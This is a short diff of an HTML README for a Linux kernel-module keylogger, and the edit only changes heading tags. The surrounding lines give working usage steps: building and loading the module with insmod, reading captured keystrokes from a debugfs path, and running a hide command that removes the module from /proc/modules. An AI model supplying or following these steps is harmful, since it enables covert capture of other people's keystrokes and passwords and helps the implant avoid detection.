@@ -15,10 +15,10 @@
 <p>cd keylogger</p>
 <p>make</p>
 <p>sudo insmod kelogger.ko</p>
-<h4>how to see the kyloging</h4>
+<h2>how to see the kyloging</h2>
 <p>cd /sys/kernel/debug/keylogger</p>
 <p>cat keyloging</p>
-<h5>how to hide and unhide the module</h5>
+<h2>how to hide and unhide the module</h2>
 <p><b>remember that after hiding the module will remove form /proc/modules and will not be recover, im working on fix it</b><p>
 <p>cd /sys/kernel/debug/keylogger</p>
 <p>./hide</p>
